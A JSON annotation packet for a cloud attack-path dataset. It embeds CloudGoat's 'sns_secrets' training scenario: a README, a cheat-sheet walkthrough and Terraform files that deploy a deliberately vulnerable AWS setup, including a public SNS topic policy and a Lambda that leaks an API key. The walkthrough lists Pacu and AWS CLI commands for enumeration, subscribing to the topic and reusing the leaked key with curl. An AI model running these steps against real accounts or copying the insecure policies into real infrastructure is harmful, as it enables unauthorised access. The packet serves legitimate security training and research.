@@ -1,0 +1,169 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "007629a9fcfb4b4279cd342c28235e011000e525558e6f83b730d8ca50dc1c93",
+  "case_id": "cloudgoat:aws:sns_secrets",
+  "role": "primary",
+  "annotator_id": "annotator_01",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:sns_secrets",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "sns_secrets",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/cheat_sheet.md"
+    ],
+    "terraform_file_count": 8,
+    "has_cheat_sheet": true,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/",
+    "review_score": 49,
+    "independence_group": "cloudgoat-scenario:sns_secrets",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/README.md",
+      "member_sha256": "57f6ee3ba1545de3c96d9f1c0b3af603d36ced5f0db654a844cc3e172378a6a5",
+      "bytes": 1893,
+      "content_kind": "md",
+      "text": "# Scenario: sns_secrets\n\n**Size:** Small\n\n**Difficulty:** Easy\n\n**Command:** `$ ./cloudgoat.py create sns_secrets`\n\n**TryHackMe Room:** [SNS Secrets Walkthrough](https://tryhackme.com/jr/snssecretswalkthrough)\n\n## Scenario Resources\n\n- 1 EC2 instance\n- 1 SNS topic\n- 1 API Gateway REST API\n- 1 IAM role\n- 1 IAM user\n\n## Scenario Start(s)\n\n1. AWS Access Key and Secret Key\n\n## Scenario Goal(s)\n\nGet the final flag by invoking the API Gateway with the leaked API key.\n\n## Summary\n\nIn this scenario, you are given AWS credentials. Your task is to enumerate permissions and discover that you have the ability to list and subscribe to SNS topics. Use Pacu's new modules, \"sns__enum\" and \"sns__subscribe,\" to subscribe to the topic. You will receive an email from the topic containing an API Key as a debug message. Next, use the AWS CLI to enumerate the API Gateways and find the path, method, stage, and resource of the API Gateway. Finally, perform a curl request with the API key to retrieve the final flag.\n\n## Exploitation Route\n\n![Lucidchart Diagram](exploitation_route.png \"Exploitation Route\")\n\n## Walkthrough - SNS Secrets\n\n1. Start by enumerating the permissions of the provided AWS access key and secret key.\n2. Enumerate SNS topics using the `sns__enum` module in Pacu to list the available topics.\n3. Subscribe to the identified SNS topic using the `sns__subscribe` module in Pacu.\n4. Confirm the subscription via the email you receive.\n5. Wait for the SNS topic to publish messages and check your email for a message containing an API Key.\n6. Enumerate API Gateways using the AWS CLI to find the API Gateway path, method, stage, and resource.\n7. Identify the correct method and stage for the API Gateway.\n8. Use `curl` with the API Key to invoke the API Gateway and retrieve the final flag.\n\nA detailed cheat sheet & walkthrough for this route is available [here](./cheat_sheet.md). \n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/cheat_sheet.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/cheat_sheet.md",
+      "member_sha256": "10860ddf766a19f09861808cf861370bc3eddd58e53ab9a8610fef5c4fca2a21",
+      "bytes": 6512,
+      "content_kind": "md",
+      "text": "# SNS_Secrets Walkthrough\n\n## Summary\n\nIn this scenario, you are provided with AWS credentials. You need to enumerate permissions and discover you can list and subscribe to SNS topics. You then use Pacu's new modules \"sns__enum\" and \"sns__subscribe\" to subscribe to the topic. You will receive an email from the topic with an API Key as a debug message. Then, use the AWS CLI to enumerate the API Gateways to find the API Gateway path, method, stage, and resource. Finally, do a curl request with the API key to get the final flag.\n\nThere is a detailed walkthrough on TryHackMe for this scenario: [SNS Secrets Walkthrough](https://tryhackme.com/jr/snssecretswalkthrough)\n\n## Video Walkthrough\n[![SNS_Secrets Video Walkthrough](https://i9.ytimg.com/vi/LBkuZa6niR0/mqdefault.jpg?v=665d1bd4&sqp=CIiU97IG&rs=AOn4CLAyCbeb1g5M58sdghxtQlC_dZECLw)](https://www.youtube.com/watch?v=LBkuZa6niR0)\n\n## Detailed Walkthrough\n\n### Configuring the AWS Keys\n\nAfter launching the scenario, you will be provided with an Access Key ID and Secret Access Key for an IAM role. These allow you to interact with the AWS account from the IAM role using the CLI (Command Line Interface). You can set up an IAM profile with this command:\n\n```bash\naws configure --profile sns-secrets\n```\n\nYou will then be prompted for the Access Key ID, Secret, and Region. Provide the keys you received after launching the scenario. Below is an example (your keys will be different.)  \n\n```bash\nAWS Access Key ID: AKIA2GIZ2CSU6NO2YIXU\nAWS Secret Access Key: SYpZBG++MXkmdvmUL614A4XAAs9L88QRrMOBhqZ9\nDefault region name: us-east-1\nDefault output format [None]:\n```\n\nFinally, you can confirm access by running the AWS equivalent of “whoami”: \n\n```bash\naws sts get-caller-identity --profile sns-secrets \n```\n\nThis should return the UserId, Account, and ARN for the role to verify you have access. \n\n### Discovering Permissions\n\nNow that we have access to an IAM user in the AWS environment, we need to figure out what permissions we have. This can be done using the AWS CLI. First, we need to see what policies are connected to our user: \n(Note: The username can be found in the output of the “aws sts get-caller-identity” command we ran previously). \n\n```bash\naws iam list-user-policies --user-name [UserName] --profile sns-secrets\n```\n\nThis command will return the policy name for our account. We can further enumerate this policy: \n\n```bash\naws iam get-user-policy --user-name [UserName] --policy-name [PolicyName] --profile sns-secrets \n```\n\nThe output of this command provides us with our policy; note our IAM User has permissions related to SNS, IAM, and API Gateway. \n\n### Subscribing to SNS\n\nAmazon Simple Notification Service (SNS) is a managed messaging service that enables you to send notifications to subscribers using various methods like email, SMS, and HTTP. It's often used for alerting, sending updates, and integrating different systems by delivering messages reliably and quickly. It's important to limit SNS access to specific users to ensure the security and integrity of your messaging system. Unrestricted access could lead to unauthorized users sending spam, triggering unnecessary alerts, or accessing sensitive information.\n\nWe can enumerate SNS with Pacu. Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments. Instructions for installing Pacu are out-of-scope for this walkthrough but you can refer to the [official Pacu documentation on Github](https://github.com/RhinoSecurityLabs/pacu). Once Pacu is installed and a session is configured, you can import the profile you configured: \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > import_keys sns-secrets\n```\n\nThere are two modules for interacting with SNS; you can find these by searching within Pacu: \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > search sns\n\n[Category: ENUM]\n\n    List and describe Simple Notification Service topics\n\n  sns__enum\n\n[Category: LATERAL_MOVE]\n\n    Subscribe to a Simple Notification Service (SNS) topic\n\n  sns__subscribe\n```\n\nLet’s begin with the “sns__enum” module. We can get more information with this command:\n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > help sns__enum\n```\n\nThe module will attempt to list and gather information from Simple Notification Service topics. Let’s run it and see if it identifies an SNS topic we can access. \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > run sns__enum --region us-east-1\n```\n\nWe can see the topic by typing “data” to access the Pacu database for our session. \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > data\n```\n\nNow that we have the full ARN of the SNS Topic, let’s check out the sns__subscribe module: \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > help sns__subscribe\n```\n\nThis module will attempt to subscribe to a topic based on the ARN via an email address. We need to provide it with the topic and an email. \n\n```bash\nPacu (sns-secrets:imported-sns-secrets) > run sns__subscribe --topics [TopicARN] --email [Email Address]\n```\n\nAfter subscribing, you will need to go to your email and confirm the subscription: \n\n![Confirm Subscription](confirm-subscription.png)\n\n### Accessing the API Gateway\n\nAfter subscribing to the topic, you will receive an SNS Message that leaks an API Key for a API Gateway. \n\n![Leaked API Key](leaked-apikey.png)\n\nNow that we have an API Key for an API Gateway, we need to identify the full URL to access the gateway. First, let’s try and retrieve basic information on the API: \n\n```bash\naws apigateway get-rest-apis --profile sns-secrets --region us-east-1\n```\n\nThis provides us with the ID of the API Gateway. Using this ID we can get the stages and resources: \n\n```bash\naws apigateway get-stages --rest-api-id [API ID] --profile sns-secrets --region us-east-1\naws apigateway get-resources --rest-api-id [API ID] --profile sns-secrets --region us-east-1\n```\n\nThese commands provide us with the following information:\n\n- Stage Name\n- Resource Path\n\n![API Gateway Information](apigateway-info.png)\n\nThis information allows us to retrieve the full URL to the API Gateway:\n\n```bash\nhttps://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]\n```\n\nFinally, we can use a CURL request with the API Key to retrieve the final flag: \n\n```bash\ncurl -X GET \\\n  'https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]' \\\n  -H 'x-api-key: 45a3da610dc64703b10e273a4db135bf'\n```\n\n![Final Flag](final-flag.png)\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/manifest.yml",
+      "member_sha256": "5c0e2c69fa22618fa0e3387fcf413e771c3d410d4fdd48ee4f48796767f7c4ee",
+      "bytes": 995,
+      "content_kind": "yml",
+      "text": "---\n  # The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: sns_secrets\n  # The name of the author(s), comma separated\n- author: Tyler Ramsbey\n  # The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 1.0\n  # Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        In this scenario, you are provided with AWS credentials. You need to enumerate permissions and discover you can list and subscribe to SNS topics. You then use Pacu's new modules \"sns__enum\" and \"sns__subscribe\" to subscribe to the topic. You will receive an email from the topic with an API Key as a debug message. Then, use the AWS CLI to enumerate the API Gateways to find the API Gateway path, method, stage, and resource. Finally, do a curl request with the API key to get the final flag.\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 06-04-2024\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/api_gateway.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/api_gateway.tf",
+      "member_sha256": "9b0e816801d260c94c24fc999a5e7cea65638d86fdf35c0de15d95db4ce1692d",
+      "bytes": 2738,
+      "content_kind": "tf",
+      "text": "resource \"aws_api_gateway_rest_api\" \"api\" {\n  name        = \"cg-api-${var.cgid}\"\n  description = \"API for demonstrating leaked API key scenario\"\n}\n\nresource \"aws_api_gateway_resource\" \"resource\" {\n  rest_api_id = aws_api_gateway_rest_api.api.id\n  parent_id   = aws_api_gateway_rest_api.api.root_resource_id\n  path_part   = \"user-data\"\n}\n\nresource \"aws_api_gateway_method\" \"method\" {\n  rest_api_id      = aws_api_gateway_rest_api.api.id\n  resource_id      = aws_api_gateway_resource.resource.id\n  http_method      = \"GET\"\n  authorization    = \"NONE\"\n  api_key_required = true\n}\n\nresource \"aws_api_gateway_integration\" \"integration\" {\n  rest_api_id = aws_api_gateway_rest_api.api.id\n  resource_id = aws_api_gateway_resource.resource.id\n  http_method = aws_api_gateway_method.method.http_method\n  type        = \"MOCK\"\n\n  request_templates = {\n    \"application/json\" = jsonencode({\n      statusCode = 200\n    })\n  }\n}\n\nresource \"aws_api_gateway_method_response\" \"method_response\" {\n  rest_api_id = aws_api_gateway_rest_api.api.id\n  resource_id = aws_api_gateway_resource.resource.id\n  http_method = aws_api_gateway_method.method.http_method\n  status_code = \"200\"\n}\n\nresource \"aws_api_gateway_integration_response\" \"integration_response\" {\n  rest_api_id = aws_api_gateway_rest_api.api.id\n  resource_id = aws_api_gateway_resource.resource.id\n  http_method = aws_api_gateway_method.method.http_method\n  status_code = aws_api_gateway_method_response.method_response.status_code\n  response_templates = {\n    \"application/json\" = jsonencode({\n      message = \"Access granted\"\n      user_data = {\n        user_id  = \"1337\"\n        username = \"SuperAdmin\"\n        email    = \"SuperAdmin@notarealemail.com\"\n        password = \"p@ssw0rd123\"\n      }\n      final_flag = \"FLAG{SNS_S3cr3ts_ar3_FUN}\"\n    })\n  }\n}\n\nresource \"aws_api_gateway_deployment\" \"deployment\" {\n  depends_on = [\n    aws_api_gateway_integration.integration,\n    aws_api_gateway_integration_response.integration_response\n  ]\n\n  rest_api_id = aws_api_gateway_rest_api.api.id\n}\n\nresource \"aws_api_gateway_stage\" \"stage\" {\n  stage_name    = \"prod-${var.cgid}\"\n  rest_api_id   = aws_api_gateway_rest_api.api.id\n  deployment_id = aws_api_gateway_deployment.deployment.id\n}\n\nresource \"aws_api_gateway_usage_plan\" \"usage_plan\" {\n  name = \"cg-usage-plan-${var.cgid}\"\n\n  api_stages {\n    api_id = aws_api_gateway_rest_api.api.id\n    stage  = aws_api_gateway_stage.stage.stage_name\n  }\n}\n\nresource \"aws_api_gateway_api_key\" \"api_key\" {\n  name    = \"cg-api-key-${var.cgid}\"\n  enabled = true\n}\n\nresource \"aws_api_gateway_usage_plan_key\" \"usage_plan_key\" {\n  key_id        = aws_api_gateway_api_key.api_key.id\n  key_type      = \"API_KEY\"\n  usage_plan_id = aws_api_gateway_usage_plan.usage_plan.id\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/data.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/data.tf",
+      "member_sha256": "a217e9e2f7d274eeb36e8f9b6dac7d70a0b422ac499908574d1837e1488aa0d7",
+      "bytes": 124,
+      "content_kind": "tf",
+      "text": "data \"archive_file\" \"lambda_code\" {\n  type        = \"zip\"\n  output_path = \"lambda.zip\"\n  source_file = \"source/lambda.py\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/iam.tf",
+      "member_sha256": "78a62567ceaa928cc6355d1ff550827242bd446027f6229d3c503a637da7e682",
+      "bytes": 2542,
+      "content_kind": "tf",
+      "text": "# IAM role used by the lambda function to publish to SNS\nresource \"aws_iam_role\" \"lambda\" {\n  name                 = \"cg-sns-secrets-${var.cgid}\"\n  description          = \"Allows Lambda to publish to SNS and write logs to CloudWatch\"\n  max_session_duration = 60 * 60\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"lambda.amazonaws.com\"\n        }\n        Action = \"sts:AssumeRole\"\n      }\n    ]\n  })\n\n  inline_policy {\n    name = \"writeCloudWatchLogs\"\n    policy = jsonencode({\n      Version = \"2012-10-17\"\n      Statement = [\n        {\n          Sid    = \"writeCloudWatchLogs\"\n          Effect = \"Allow\"\n          Action = [\n            \"logs:CreateLogStream\",\n            \"logs:PutLogEvents\"\n          ]\n          Resource = \"${aws_cloudwatch_log_group.lambda.arn}:log-stream:*\"\n        },\n        {\n          Sid      = \"publishSNS\"\n          Effect   = \"Allow\"\n          Action   = \"sns:Publish\"\n          Resource = aws_sns_topic.public_topic.arn\n        }\n      ]\n    })\n  }\n}\n\n\n# IAM User for subscribing to SNS\nresource \"aws_iam_user\" \"sns_user\" {\n  name = \"cg-sns-user-${var.cgid}\"\n}\n\nresource \"aws_iam_user_policy\" \"sns_user_policy\" {\n  name = \"cg-sns-user-policy-${var.cgid}\"\n  user = aws_iam_user.sns_user.name\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect = \"Allow\"\n        Action = [\n          \"sns:Subscribe\",\n          \"sns:Receive\",\n          \"sns:ListSubscriptionsByTopic\",\n          \"sns:ListTopics\",\n          \"sns:GetTopicAttributes\",\n          \"iam:ListGroupsForUser\",\n          \"iam:ListUserPolicies\",\n          \"iam:GetUserPolicy\",\n          \"iam:ListAttachedUserPolicies\",\n          \"apigateway:GET\"\n        ]\n        Resource = \"*\"\n      },\n      {\n        Effect = \"Deny\"\n        Action = \"apigateway:GET\"\n        Resource = [\n          \"arn:aws:apigateway:${var.region}::/apikeys\",\n          \"arn:aws:apigateway:${var.region}::/apikeys/*\",\n          \"arn:aws:apigateway:${var.region}::/restapis/*/resources/*/methods/GET\",\n          \"arn:aws:apigateway:${var.region}::/restapis/*/methods/GET\",\n          \"arn:aws:apigateway:${var.region}::/restapis/*/resources/*/integration\",\n          \"arn:aws:apigateway:${var.region}::/restapis/*/integration\",\n          \"arn:aws:apigateway:${var.region}::/restapis/*/resources/*/methods/*/integration\"\n        ]\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_access_key\" \"sns_user_key\" {\n  user = aws_iam_user.sns_user.name\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/lambda.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/lambda.tf",
+      "member_sha256": "5086ed0352af1260152c547f618a011c4c1777071cb074a6fe67008aeb399310",
+      "bytes": 1673,
+      "content_kind": "tf",
+      "text": "resource \"aws_cloudwatch_log_group\" \"lambda\" {\n  name              = \"/aws/lambda/cg-sns-secrets-${var.cgid}\"\n  retention_in_days = 1\n  skip_destroy      = false\n}\n\nresource \"aws_lambda_function\" \"sns_publisher\" {\n  function_name = \"cg-sns-secrets-${var.cgid}\"\n  description   = \"Pubishes API gateway secrets to SNS\"\n  runtime       = \"python3.12\"\n  package_type  = \"Zip\"\n  role          = aws_iam_role.lambda.arn\n  handler       = \"lambda.handler\"\n  memory_size   = 128\n  timeout       = 63\n\n  source_code_hash = data.archive_file.lambda_code.output_base64sha256\n  filename         = data.archive_file.lambda_code.output_path\n\n  logging_config {\n    log_format = \"JSON\"\n    log_group  = aws_cloudwatch_log_group.lambda.name\n  }\n\n  environment {\n    variables = {\n      API_GATEWAY_KEY = aws_api_gateway_api_key.api_key.value\n      SNS_ARN         = aws_sns_topic.public_topic.arn\n    }\n  }\n}\n\n\nresource \"aws_cloudwatch_event_rule\" \"lambda_cron_trigger\" {\n  name                = \"cg-sns-secrets-${var.cgid}\"\n  description         = \"Triggers the CloudGoat sns lambda function every 2 minutes\"\n  schedule_expression = \"rate(2 minutes)\"\n  state               = \"ENABLED\"\n}\n\nresource \"aws_cloudwatch_event_target\" \"lambda_trigger\" {\n  arn  = aws_lambda_function.sns_publisher.arn\n  rule = aws_cloudwatch_event_rule.lambda_cron_trigger.name\n}\n\nresource \"aws_lambda_permission\" \"allow_eventbridge_trigger\" {\n  statement_id  = \"AllowExecutionFromEventBridge\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.sns_publisher.function_name\n  principal     = \"events.amazonaws.com\"\n  source_arn    = aws_cloudwatch_event_rule.lambda_cron_trigger.arn\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/output.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/output.tf",
+      "member_sha256": "4a6e2100dc896f6e949b105e120ae88e330025b57f2a4e5f332bc2b5b0d6adc4",
+      "bytes": 194,
+      "content_kind": "tf",
+      "text": "output \"sns_user_access_key_id\" {\n  value = aws_iam_access_key.sns_user_key.id\n}\n\noutput \"sns_user_secret_access_key\" {\n  value     = aws_iam_access_key.sns_user_key.secret\n  sensitive = true\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/provider.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/provider.tf",
+      "member_sha256": "55430c3079d13d7ee123a1965e9eae86a9330cacdf7b8fbd03cc26775be14b67",
+      "bytes": 409,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n    archive = {\n      source  = \"hashicorp/archive\"\n      version = \">= 2.6.0\"\n    }\n  }\n}\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/sns.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/sns.tf",
+      "member_sha256": "f3d98b4625c117ef68fd543f999d654755313edc9e850c8b3455ac9bd758f6a3",
+      "bytes": 559,
+      "content_kind": "tf",
+      "text": "# Create SNS Topic\nresource \"aws_sns_topic\" \"public_topic\" {\n  name = \"public-topic-${var.cgid}\"\n}\n\n# SNS Topic Policy to allow public access\nresource \"aws_sns_topic_policy\" \"public_topic_policy\" {\n  arn = aws_sns_topic.public_topic.arn\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Effect    = \"Allow\"\n        Principal = \"*\"\n        Action = [\n          \"sns:Subscribe\",\n          \"sns:Receive\",\n          \"sns:ListSubscriptionsByTopic\"\n        ]\n        Resource = aws_sns_topic.public_topic.arn\n      }\n    ]\n  })\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/sns_secrets/terraform/variables.tf",
+      "member_sha256": "3f1e95bb02f22908b27ef89b9a957cc8dbb47bf2f8401e9cdbf11122c5072a9b",
+      "bytes": 667,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming\"\n  type        = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address(es)\"\n  type        = list(string)\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy to\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the CloudGoat stack\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario\"\n  default     = \"iam_privesc_by_key_rotation\"\n  type        = string\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "b82d442497e0860df84f4308a65c307333f857575ec7290b4927e2159d0b2567",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
